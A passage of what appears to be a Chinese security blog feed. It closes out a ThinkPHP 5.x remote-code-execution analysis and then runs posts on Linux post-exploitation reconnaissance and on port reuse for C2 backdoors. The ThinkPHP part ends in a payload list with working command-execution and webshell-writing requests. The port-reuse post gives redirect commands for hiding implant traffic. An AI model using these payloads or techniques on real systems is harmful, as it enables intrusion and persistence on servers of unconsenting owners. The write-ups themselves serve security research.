class="mord cjk_fallback">做</span><span class="mord cjk_fallback">了</span><span class="mord cjk_fallback">判</span><span class="mord cjk_fallback">断</span><span class="mord cjk_fallback">处</span><span class="mord cjk_fallback">理</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">低</span><span class="mord cjk_fallback">版</span><span class="mord cjk_fallback">本</span><span class="mord cjk_fallback">没</span><span class="mord cjk_fallback">有</span><span class="mord cjk_fallback">值</span><span class="mord cjk_fallback">会</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">组</span><span class="mord cjk_fallback">越</span><span class="mord cjk_fallback">界</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">分</span><span class="mord cjk_fallback">析</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">下</span><span class="mord cjk_fallback">获</span><span class="mord cjk_fallback">取</span></span></span></span>method值的部分</p><p><img src="../../../typora-user-images/image-20240813182615250.png" alt="image-20240813182615250" /></p><p>跟进去，这里的方法在我们上面已经分析过了，是漏洞的触发点，会走到第一个框内的逻辑，然后传入construct对Request类的属性进行覆盖。我们看一下函数的返回值，发现返回的this-&gt;method，我们上面已经可以进行覆盖了，所以这里可以选择在post body中覆盖method，这样就不会数组越界了。</p><p><img src="../../../typora-user-images/image-20240815110124941.png" alt="image-20240815110124941" /></p><p>rules数组存在如下key值，保证不越界即可。</p><p><img src="../../../typora-user-images/image-20240815111159943.png" alt="image-20240815111159943" /></p><p>因此随便选择一个值赋值即可。</p><p>最终payload:</p><p><strong>aaaaa</strong>=<strong>calc</strong>&amp;<strong>_method</strong>=<strong>__construct</strong>&amp;<strong>filter</strong>[]=<strong>system</strong>&amp;<strong>method</strong>=<strong>name</strong></p><p><img src="../../../typora-user-images/image-20240815111449636.png" alt="image-20240815111449636" /></p><h4 id="tp-508version5012"><a class="markdownIt-Anchor" href="#tp-508version5012"></a> TP 5.0.8&lt;=version&lt;=5.0.12</h4><p>这个我们最初的例子就是5.0.12的，因此不过多赘述。</p><h4 id="tp-5013version-5116"><a class="markdownIt-Anchor" href="#tp-5013version-5116"></a> TP 5.0.13&lt;=version&lt;= 5.1.16</h4><p>搭起来5.0.14的环境，使用5.0.12的payload，debug看一下过程</p><p>发现最终触发点的$filter没有赋值到。</p><p><img src="../../../typora-user-images/image-20240815143328858.png" alt="image-20240815143328858" /></p><p>看一下5.0.13和5.0.5的diff</p><p><a href="https://github.com/top-think/framework/compare/v5.0.5...v5.0.13#diff-d86cf2606459bf4da21b7c3a1f7191f3">https://github.com/top-think/framework/compare/v5.0.5...v5.0.13#diff-d86cf2606459bf4da21b7c3a1f7191f3</a></p><p>在上面的漏洞分析流程中，找到可能更新了filter的地方。如下图，更新了filter。</p><p><img src="../../../typora-user-images/image-20240815142514799.png" alt="image-20240815142514799" /></p><p>在对应位置打个断点，此时我们传入的filter已经覆盖为Request类的filter属性</p><p><img src="../../../typora-user-images/image-20240815145706757.png" alt="image-20240815145706757" /></p><p>这个方法跟入就是覆盖filter的方法。而参数$config[‘default_filter’]为空，也就将我们传入的system覆盖为空了，也就导致无法执行5.0.12版本的payload。</p><p><img src="../../../typora-user-images/image-20240815145848660.png" alt="image-20240815145848660" /></p><p>那么想办法让逻辑不进入图中的方法，寻找其他触发点：</p><ol><li>我们上面分析过，当开启debug时，可以走另一套触发逻辑。</li><li>寻找其他触发位置，且触发位置不能在上面的module方法后面，必须在前面</li></ol><p>我们寻找一下上面的module方法。是一套switch逻辑，我们看一下能否走入controller和method逻辑</p><p><img src="../../../typora-user-images/image-20240815150437594.png" alt="image-20240815150437594" /></p><p>图中的是ThinkPHP不同的路由方式，具体如下：<a href="https://www.kancloud.cn/manual/thinkphp5/118037">https://www.kancloud.cn/manual/thinkphp5/118037</a></p><p>我们要进入的是方法3和方法4，接下来就是寻找TP代码在定义路由时，是否有对应的定义方式。</p><p><img src="../../../typora-user-images/image-20240815171134142.png" alt="image-20240815171134142" /></p><p>看一下<strong>TP完整版</strong>的composer配置，发现会自动安装很多模块。(为了漏洞复现的话，也可以直接配置&quot;topthink/think-captcha&quot;: “^1.0”)</p><p><img src="../../../typora-user-images/image-20240815112918572.png" alt="image-20240815112918572" /></p><p>TP在初始化时，存在自动类加载机制，将 <strong>vendor</strong> 目录下的文件加载，因此会存在captcha路由。（完整版会默认存在此路由）</p><p>下图中我们发现注册了一个get的、路由到类的方法，符合我们的漏洞触发点。</p><p><img src="../../../typora-user-images/image-20240807174519099.png" alt="image-20240807174519099" /></p><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;?s&#x3D;&#x2F;captcha&amp;XDEBUG_SESSION_START&#x3D;18306 HTTP&#x2F;1.1Host: tp5014Content-Type: application&#x2F;x-www-form-urlencodedUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;83.0.4103.116 Safari&#x2F;537.36aaaaa&#x3D;calc&amp;_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;name<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们拿上面分析好payload加上captcha路由测试一下，测试后发现没有成功，我们回到定义路由的地方发现路由定义的是get方式，因此无法找到最终的定义规则很正常。我们跟回代码。</p><p>这里的rule数据包含着路由规则，get存储着我们想利用的captcha路由，这里与上面的思路类似，$method是可控的，因此把他修改为get就可以了</p><p><img src="../../../typora-user-images/image-20240815172003658.png" alt="image-20240815172003658" /></p><p><img src="../../../typora-user-images/image-20240815172143487.png" alt="image-20240815172143487" /></p><h4 id="tp-5117-version-5132"><a class="markdownIt-Anchor" href="#tp-5117-version-5132"></a> TP 5.1.17&lt;= version &lt;= 5.1.32</h4><p>高版本的代码有变化， 低版本可以使用construct调用方法，高版本直接改成赋值了。</p><p>也就是说，我们无法对Request类的任意属性进行覆盖了。</p><p><img src="../../../typora-user-images/image-20240815173008272.png" alt="image-20240815173008272" /></p><p>开一下debug，发现提示无键值。</p><p><img src="../../../typora-user-images/image-20240815175017161.png" alt="image-20240815175017161" /></p><p>找到触发位置，这里与上面调试遇见的问题类似，不过这里无法进行覆盖了。</p><p><img src="../../../typora-user-images/image-20240815174828864.png" alt="image-20240815174828864" /></p><p><img src="../../../typora-user-images/image-20240815174841800.png" alt="image-20240815174841800" /></p><h5 id="理论中的利用方法"><a class="markdownIt-Anchor" href="#理论中的利用方法"></a> 理论中的利用方法</h5><p><a href="https://www.cnblogs.com/iamstudy/articles/thinkphp_5_x_rce_1.html">https://www.cnblogs.com/iamstudy/articles/thinkphp_5_x_rce_1.html</a></p><p>这篇文章提出了一个理论方法，但是本地未复现出，实战意义也有限，仅当拓展。</p><h2 id="4payload汇总-2"><a class="markdownIt-Anchor" href="#4payload汇总-2"></a> 4.Payload汇总</h2><h3 id="tp-500v507"><a class="markdownIt-Anchor" href="#tp-500v507"></a> TP 5.0.0&lt;=V&lt;=5.0.7</h3><pre class="line-numbers language-none"><code class="language-none">POST ?s&#x3D;index&#x2F;indexs&#x3D;whoami&amp;_method&#x3D;__construct&amp;method&#x3D;POST&amp;filter[]&#x3D;systemaaaa&#x3D;whoami&amp;_method&#x3D;__construct&amp;method&#x3D;GET&amp;filter[]&#x3D;system_method&#x3D;__construct&amp;method&#x3D;GET&amp;filter[]&#x3D;system&amp;get[]&#x3D;whoami<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">POSTs&#x3D;file_put_contents(&#39;test.php&#39;,&#39;&lt;?php phpinfo();&#39;)&amp;_method&#x3D;__construct&amp;method&#x3D;POST&amp;filter[]&#x3D;assert&#x2F;&#x2F;写shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="tp-508v5012"><a class="markdownIt-Anchor" href="#tp-508v5012"></a> TP 5.0.8&lt;=V&lt;=5.0.12</h3><pre class="line-numbers language-none"><code class="language-none">POST ?s&#x3D;index&#x2F;indexs&#x3D;whoami&amp;_method&#x3D;__construct&amp;method&#x3D;POST&amp;filter[]&#x3D;systemaaaa&#x3D;whoami&amp;_method&#x3D;__construct&amp;method&#x3D;GET&amp;filter[]&#x3D;system_method&#x3D;__construct&amp;method&#x3D;GET&amp;filter[]&#x3D;system&amp;get[]&#x3D;whoamic&#x3D;system&amp;f&#x3D;calc&amp;_method&#x3D;filter<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-POST" data-language="POST"><code class="language-POST">POSTs&#x3D;file_put_contents(&#39;test.php&#39;,&#39;&lt;?php phpinfo();&#39;)&amp;_method&#x3D;__construct&amp;method&#x3D;POST&amp;filter[]&#x3D;assert&#x2F;&#x2F;写shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="tp-5013v-5116"><a class="markdownIt-Anchor" href="#tp-5013v-5116"></a> TP 5.0.13&lt;=V&lt;= 5.1.16</h3><p>需要开启debug：</p><pre class="line-numbers language-none"><code class="language-none">POST ?s&#x3D;index&#x2F;indexs&#x3D;whoami&amp;_method&#x3D;__construct&amp;method&#x3D;POST&amp;filter[]&#x3D;systemaaaa&#x3D;whoami&amp;_method&#x3D;__construct&amp;method&#x3D;GET&amp;filter[]&#x3D;system_method&#x3D;__construct&amp;method&#x3D;GET&amp;filter[]&#x3D;system&amp;get[]&#x3D;whoamic&#x3D;system&amp;f&#x3D;calc&amp;_method&#x3D;filter<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">POSTs&#x3D;file_put_contents(&#39;test.php&#39;,&#39;&lt;?php phpinfo();&#39;)&amp;_method&#x3D;__construct&amp;method&#x3D;POST&amp;filter[]&#x3D;assert&#x2F;&#x2F; 写shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>完整版存在captcha路由的情况：</p><pre class="line-numbers language-none"><code class="language-none">POST ?s&#x3D;captchaaaaa&#x3D;calc&amp;_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="tp-5117-v-5132"><a class="markdownIt-Anchor" href="#tp-5117-v-5132"></a> TP 5.1.17&lt;= V&lt;= 5.1.32</h3><p>理论的利用方法：（未验证过）</p><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;c&#x3D;exec&amp;f&#x3D;calc.exe&amp;_method&#x3D;filter<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="参考链接"><a class="markdownIt-Anchor" href="#参考链接"></a> 参考链接</h1><p><a href="https://todis21.github.io/2023/07/08/ThinkPHP-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">https://todis21.github.io/2023/07/08/ThinkPHP-代码审计/</a></p><p><a href="https://www.cnblogs.com/lingzhisec/p/15728886.html">https://www.cnblogs.com/lingzhisec/p/15728886.html</a></p><p><a href="https://xz.aliyun.com/t/3570">https://xz.aliyun.com/t/3570</a></p><p><a href="https://xz.aliyun.com/t/6106">https://xz.aliyun.com/t/6106</a></p><p><a href="https://y4er.com/posts/thinkphp5-rce/">https://y4er.com/posts/thinkphp5-rce/</a></p><p><a href="https://www.cnblogs.com/wkzb/p/14156026.html">https://www.cnblogs.com/wkzb/p/14156026.html</a></p><p><a href="https://www.cnblogs.com/iamstudy/articles/thinkphp_5_x_rce_1.html">https://www.cnblogs.com/iamstudy/articles/thinkphp_5_x_rce_1.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-启&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#0x00-启&quot;&gt;&lt;/a&gt; 0x00 启&lt;/h1&gt;
&lt;p&gt;黑盒debug开启会报错出具体版本&lt;/p&gt;
&lt;p&gt;白盒看本地tp代码&lt;/p&gt;
&lt;p&gt;tp3 在目录的ThinkPHP文件</summary>
      
    
    
    
    
    <category term="ThinkPHP" scheme="https://cyxsec.github.io/tags/ThinkPHP/"/>
    
  </entry>
  
  <entry>
    <title>Linux后渗透研究--Linux特性利用和极限场景处理</title>
    <link href="https://cyxsec.github.io/2023/04/Linux%E5%90%8E%E6%B8%97%E9%80%8F%E7%A0%94%E7%A9%B6--Linux%E7%89%B9%E6%80%A7%E5%88%A9%E7%94%A8%E5%92%8C%E6%9E%81%E9%99%90%E5%9C%BA%E6%99%AF%E5%A4%84%E7%90%86/"/>
    <id>https://cyxsec.github.io/2023/04/Linux%E5%90%8E%E6%B8%97%E9%80%8F%E7%A0%94%E7%A9%B6--Linux%E7%89%B9%E6%80%A7%E5%88%A9%E7%94%A8%E5%92%8C%E6%9E%81%E9%99%90%E5%9C%BA%E6%99%AF%E5%A4%84%E7%90%86/</id>
    <published>2023-04-29T03:28:25.000Z</published>
    <updated>2024-10-16T05:37:18.121Z</updated>
    
    <content type="html"><![CDATA[<p>Linux渗透的时候要理解和接受一个概念：Linux一切皆文件</p><p><strong>简单记录一下渗透中利用的Linux特性、后渗透的极限场景处理</strong></p><p>Linux不同发行版有他们自己的特性，这些特性在渗透和后渗透中都可以用到</p><h2 id="0x01-查看系统ip信息"><a class="markdownIt-Anchor" href="#0x01-查看系统ip信息"></a> 0x01 查看系统ip信息</h2><ul><li>阉割 ip a、ifconfig</li></ul><p>在<strong>非DHCP</strong>情况下，不同发行版在本地文件可以找到ip配置信息</p><p>RHEL/CentOS系</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-&lt;interface&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="../../../typora-user-images/image-20240429114106822.png" alt="image-20240429114106822" /></p><p>Debian系</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;etc&#x2F;network&#x2F;interfaces<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其他：</p><ul><li>查看arp表</li><li>hostname -I</li><li>端口连接信息</li></ul><h2 id="0x02-查看端口连接信息"><a class="markdownIt-Anchor" href="#0x02-查看端口连接信息"></a> 0x02 查看端口连接信息</h2><p>/proc/net 下面的tcp和udp文件会存储网络端口连接情况</p><p><img src="../../../typora-user-images/image-20240527102511919.png" alt="image-20240527102511919" /></p><h2 id="0x03-判断发行版"><a class="markdownIt-Anchor" href="#0x03-判断发行版"></a> 0x03 判断发行版</h2><h3 id="读取相关配置文件"><a class="markdownIt-Anchor" href="#读取相关配置文件"></a> 读取相关配置文件</h3><p>/proc/version</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20241015180201337.png" alt="image-20241015180201337" /></p><p>/etc/issue（例子中的centos没有读取到信息）</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20241015180327229.png" alt="image-20241015180327229" /></p><p>/etc/os-release</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20241015180457090.png" alt="image-20241015180457090" /></p><h3 id="利用不同发行版特性"><a class="markdownIt-Anchor" href="#利用不同发行版特性"></a> 利用不同发行版特性</h3><p>包管理器区分（列目录查看）：debain和ubuntu用apt，centos用yum</p><p>/etc/debian_version：这个文件在所有基于 Debian 的系统中存在，并记录当前 Debian 的版本号。</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20241015180748718.png" alt="image-20241015180748718" /></p><p>/etc/lsb-release：Ubuntu 系列中，通常还有 <code>/etc/lsb-release</code> 文件，包含关于系统的详细信息：</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20241015180830851.png" alt="image-20241015180830851" /></p><h2 id="0x04-获取内核版本"><a class="markdownIt-Anchor" href="#0x04-获取内核版本"></a> 0x04 获取内核版本</h2><h3 id="命令"><a class="markdownIt-Anchor" href="#命令"></a> 命令</h3><p>uname -a</p><p>hostnamectl</p><h3 id="本地记录信息的文件"><a class="markdownIt-Anchor" href="#本地记录信息的文件"></a> 本地记录信息的文件</h3><p><code>/proc/version</code> 文件包含关于内核版本的详细信息，包括编译器版本和编译时间。</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20241015180201337.png" alt="image-20241015180201337" /></p><h3 id="其他记录信息的文件"><a class="markdownIt-Anchor" href="#其他记录信息的文件"></a> 其他记录信息的文件</h3><p>主要包括内核相关目录、启动日志等。这些目录下面的文件包含着内核版本号信息。</p><p><code>/proc/version</code>：详细的内核和编译信息。</p><p><code>/boot/vmlinuz-*</code>：内核镜像文件，文件名包含版本号。</p><p><code>/usr/src/linux-headers-*</code>：内核头文件，目录名包含版本号。</p><p><code>/lib/modules/*</code>：内核模块目录，子目录名为内核版本号。</p><p><code>/proc/sys/kernel/osrelease</code>：直接包含内核版本号。</p><p><code>/var/log/dmesg</code>：内核启动日志，包含内核版本。</p><p><code>/boot/config-*</code>：内核编译配置文件，文件名包含版本号。</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20241016102347912.png" alt="image-20241016102347912" /></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Linux渗透的时候要理解和接受一个概念：Linux一切皆文件&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;简单记录一下渗透中利用的Linux特性、后渗透的极限场景处理&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Linux不同发行版有他们自己的特性，这些特性在渗透和后渗透中都可以用到&lt;/p&gt;
&lt;h</summary>
      
    
    
    
    
    <category term="后渗透" scheme="https://cyxsec.github.io/tags/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>端口复用技术</title>
    <link href="https://cyxsec.github.io/2022/08/%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8%E6%8A%80%E6%9C%AF/"/>
    <id>https://cyxsec.github.io/2022/08/%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8%E6%8A%80%E6%9C%AF/</id>
    <published>2022-08-03T03:16:57.000Z</published>
    <updated>2024-07-22T08:44:46.829Z</updated>
    
    <content type="html"><![CDATA[<p>很多情况下遇到无法解析webshell环境（python之类的rce），或内网环境遇到强隔离，限定了通讯端口。</p><p>端口复用工作中用的不算太多，主要是考虑客户业务的稳定性，导致很多时候不太敢上端口复用。</p><p>端口复用根据不同场景有不同的实现方案，下面简单总结一下。</p><p><strong>具体的概念可以直接看这篇，讲的十分详细，在网上搜了很多篇， 感觉都是抄的这篇，写的确实好</strong>：<a href="http://mobile.51cto.com/hot-557084.html">http://mobile.51cto.com/hot-557084.html</a></p><h2 id="0x01基于端口转发协议分流的端口复用"><a class="markdownIt-Anchor" href="#0x01基于端口转发协议分流的端口复用"></a> 0x01基于端口转发+协议分流的端口复用</h2><p>配置过程大概是：</p><ul><li>使用分流工具，监听本地9999端口的流量，根据协议做分流区分，如正常的http协议依然按照正常的业务逻辑转发到80端口，其他我们指定的协议就可以转发到我们实际的利用端口，即可完成端口复用。</li></ul><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;github.com&#x2F;Pandentia&#x2F;protoplex这是一个协议复用的工具，比如命令可将本地9999端口的流量根据协议类型转到本地的2333和80端口。注: 在实战环境中，先用protoplex进行分流，然后再进行重定向。.&#x2F;protoplex --socks5 192.168.154.130:2333 --http 127.0.0.1:80 -b 192.168.154.130:9999注: protoplex设置分流的http协议IP和重定向的ip不要设置为同一个ip,否则会形成闭环。同时该工具还支持其他协议的分流，如：    SSH    HTTP    TLS (&#x2F; HTTPS)    OpenVPN    SOCKS4 &#x2F; SOCKS5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>利用netsh（win）和iptables （Linux）配置端口转发策略，将请求服务器80端口的流量转发到本地的9999端口（对应监听即可）</p><pre class="line-numbers language-none"><code class="language-none">linux将访问80的流量重定向到9999端口sudo iptables -t nat -A PREROUTING -p tcp -m tcp --dport 80 -j REDIRECT --to-ports 9999windows将本地80流量重定向到9999netsh interface portproxy add v4tov4 listenport&#x3D;80 listenaddress&#x3D;192.168.154.129 connectport&#x3D;9999 connectaddress&#x3D;192.168.154.129<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>大致过程如下：</p></li></ul><p><img src="../../../typora-user-images/image-20240704171847360.png" alt="image-20240704171847360" /></p><p>实战中有一些http的web，就可以设置https的上线beacon，通过此方式进行中转上线。</p><p><strong>yy一句，理论上不单单可以根据协议区分，协议只是一个比较明显的特征，区分不同的数据包，在协议相同的情况下也可以做到端口复用，是理论上的思路，没找到现成的工具</strong></p><h2 id="0x02基于httpsys-winrm-端口复用"><a class="markdownIt-Anchor" href="#0x02基于httpsys-winrm-端口复用"></a> 0x02基于HTTP.sys + Winrm 端口复用</h2><p>首先明确概念</p><p>HTTP.sys是iis的驱动，iis中不同应用可以使用相同的端口，这也是其驱动的工作原理，可以根据注册的URL前缀，将请求分发到不同应用，也就实现了端口复用。（其实和反向代理差不多）</p><p>Winrm服务，这个我们在内网渗透中用的比较多，这个服务在2012及其以后的机器默认开放，他本质上就是在<strong>HTTP.sys上注册了wsman的URL前缀，默认监听端口5985</strong>，所以也能理解为什么winrm默认走的http协议。</p><p>所以这个复用也就很好理解了，<em>配置好winrm，就能在web服务连接winrm服务。</em></p><p>这个复用最终的效果就是使用winrm服务，winrm服务的特点我们搞内网多也知道横向移动可以使用该端口认证执行命令（此过程无文件落地）。</p><p>目前能想到的应用点：</p><ul><li>横向移动/后门</li><li>应对极端环境下的渗透测试任务（防火墙策略配置很死、强终端对抗，如：无法落地文件</li></ul><p>理解整个利用过程，这里的winrm服务我们也能理解是个代指，winrm是windows自带的，我们实战一样可以自实现调用这种http.sys驱动机制的API接口，最终实现一个类winrm服务做后门。（webshell等，又回到了上面的正向HTTP隧道）</p><p>大概就是：<a href="https://github.com/3gstudent/Homework-of-C-Language/blob/master/UsePipeToExeCmd.cpp">https://github.com/3gstudent/Homework-of-C-Language/blob/master/UsePipeToExeCmd.cpp</a></p><p>三好学生写的是命令执行，那理论上应该也可以做正向http隧道？但目前没找到现成的工具，后面实战用到再考虑。</p><h2 id="0x03基于socket绑定特性的端口复用"><a class="markdownIt-Anchor" href="#0x03基于socket绑定特性的端口复用"></a> 0x03基于socket绑定特性的端口复用</h2><p>我们知道，一般来说在我们启动一个新的端口，如果当前端口已被占用，就会出现以下错误。</p><pre class="line-numbers language-none"><code class="language-none">Error: listen tcp 127.0.0.1:8080: bind: Only one usage of each socket address (protocol&#x2F;network address&#x2F;port) is normally permitted.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在缺省条件下，一个套接口不能与一个已在使用中的本地地址捆绑（bind())）。但有时会需要“重用”地址。因为每一个连接都由本地地址和远端地址的组合唯一确定，所以只要远端地址不同，两个套接口与一个地址捆绑并无大碍。为了通知套接口实现不要因为一个地址已被一个套接口使用就不让它与另一个套接口捆绑。</p><p>然而，根据TCP/IP标准，端口本身是允许复用的。绑定端口的本质是，当系统接收到一个TCP报文段或UDP数据报时，可以根据其头部的端口字段找到对应的进程，并将数据传递给相应的进程。多个业务共用同一个端口的情况下其实很常见</p><p>在这个背景下，<code>SO_REUSEPORT</code> 和 <code>SO_REUSEADDR</code> 是两个套接字选项，它们允许在特定情况下重新使用端口：</p><ul><li><strong>SO_REUSEPORT：</strong> 允许多个套接字同时绑定到相同的地址和端口，可以同时接收传入的连接，适用于实现负载均衡或者多进程/线程同时监听同一端口的场景。</li><li><strong>SO_REUSEADDR：</strong> 允许在一个套接字使用过程中被终止后，其他套接字可以立即再次绑定到相同的地址和端口，有助于在服务器重启后快速恢复服务。</li></ul><p>我们在建立socket连接时，指定好这两个参数，就可以重新使用已经绑定的端口，完成端口复用了。</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">var</span> lc <span class="token operator">=</span> net<span class="token punctuation">.</span>ListenConfig<span class="token punctuation">&#123;</span>Control<span class="token punctuation">:</span> <span class="token keyword">func</span><span class="token punctuation">(</span>network<span class="token punctuation">,</span> address <span class="token builtin">string</span><span class="token punctuation">,</span> c syscall<span class="token punctuation">.</span>RawConn<span class="token punctuation">)</span> <span class="token builtin">error</span> <span class="token punctuation">&#123;</span><span class="token keyword">var</span> opErr <span class="token builtin">error</span><span class="token keyword">if</span> err <span class="token operator">:=</span> c<span class="token punctuation">.</span><span class="token function">Control</span><span class="token punctuation">(</span><span class="token keyword">func</span><span class="token punctuation">(</span>fd <span class="token builtin">uintptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>opErr <span class="token operator">=</span> windows<span class="token punctuation">.</span><span class="token function">SetsockoptInt</span><span class="token punctuation">(</span>windows<span class="token punctuation">.</span><span class="token function">Handle</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">,</span> windows<span class="token punctuation">.</span>SOL_SOCKET<span class="token punctuation">,</span> windows<span class="token punctuation">.</span>SO_REUSEADDR<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> err<span class="token punctuation">&#125;</span><span class="token keyword">return</span> opErr<span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>缺点：iis无法复用（iis5以下可以，可以考虑使用上面HTTP.sys的方法）、3389无法复用（RDP可以考虑采用隧道方式：<a href="https://github.com/nccgroup/SocksOverRDP%EF%BC%89">https://github.com/nccgroup/SocksOverRDP）</a></p><h3 id="socket复用技术缺点"><a class="markdownIt-Anchor" href="#socket复用技术缺点"></a> socket复用技术缺点</h3><p>理论很丰满，现实众是否真的这么简单呢？</p><p>我们设置socket的SO_REUSEADDR参数并不一定其作用</p><ul><li>程序编写人员 socket 在绑定前需要使用 setsockopt 指定 SO_EXCLUSIVEADDRUSE   要求独占所有的端口地址，而不允许复用。这样其它人就无法复用这个端口了，即使你设置了 socket 为 SO_REUSEADDR   也没有用，程序根本跑不起来。</li><li>iis无法复用</li></ul><p><img src="../../../typora-user-images/image-20240715154737649.png" alt="image-20240715154737649" /></p><h2 id="0x04基于驱动的端口复用"><a class="markdownIt-Anchor" href="#0x04基于驱动的端口复用"></a> 0x04基于驱动的端口复用</h2><p>使用驱动程序进行端口复用和转发：</p><p><a href="https://github.com/Arno0x/DivertTCPconn">https://github.com/Arno0x/DivertTCPconn</a></p><p><a href="https://github.com/praetorian-inc/PortBender">https://github.com/praetorian-inc/PortBender</a></p><p>原理之后有精力再去分析</p><h2 id="0x05-参考连接"><a class="markdownIt-Anchor" href="#0x05-参考连接"></a> 0x05 参考连接：</h2><p>（frsocks+protoplex+流量重定向实现端口复用）<a href="https://uknowsec.cn/posts/notes/frsocks+protoplex+%E6%B5%81%E9%87%8F%E9%87%8D%E5%AE%9A%E5%90%91%E5%AE%9E%E7%8E%B0%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8.html">https://uknowsec.cn/posts/notes/frsocks+protoplex+流量重定向实现端口复用.html</a></p><p>（一条命令实现端口复用后门）<a href="https://paper.seebug.org/1004/">https://paper.seebug.org/1004/</a></p><p>（利用IIS的端口共享功能绕过防火墙）<a href="https://3gstudent.github.io/%E5%88%A9%E7%94%A8IIS%E7%9A%84%E7%AB%AF%E5%8F%A3%E5%85%B1%E4%BA%AB%E5%8A%9F%E8%83%BD%E7%BB%95%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99">https://3gstudent.github.io/利用IIS的端口共享功能绕过防火墙</a></p><p>（探索基于HTTP.SYS实现权限维持）<a href="https://c1y2m3.github.io/2019/11/21/%E6%8E%A2%E7%B4%A2%E5%9F%BA%E4%BA%8EHTTP.SYS%E5%AE%9E%E7%8E%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/">https://c1y2m3.github.io/2019/11/21/探索基于HTTP.SYS实现权限维持/</a></p><p><a href="https://github.com/p1d3er/port_reuse">https://github.com/p1d3er/port_reuse</a></p><p>（聊聊端口复用的实现和坑点）<a href="http://mobile.51cto.com/hot-557084.html">http://mobile.51cto.com/hot-557084.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;很多情况下遇到无法解析webshell环境（python之类的rce），或内网环境遇到强隔离，限定了通讯端口。&lt;/p&gt;
&lt;p&gt;端口复用工作中用的不算太多，主要是考虑客户业务的稳定性，导致很多时候不太敢上端口复用。&lt;/p&gt;
&lt;p&gt;端口复用根据不同场景有不同的实现方案，下面简单</summary>
      
    
    
    
    
    <category term="端口复用" scheme="https://cyxsec.github.io/tags/%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>不出网C2上线</title>
    <link href="https://cyxsec.github.io/2022/07/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BFC2/"/>
    <id>https://cyxsec.github.io/2022/07/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BFC2/</id>
    <published>2022-07-05T03:16:57.000Z</published>
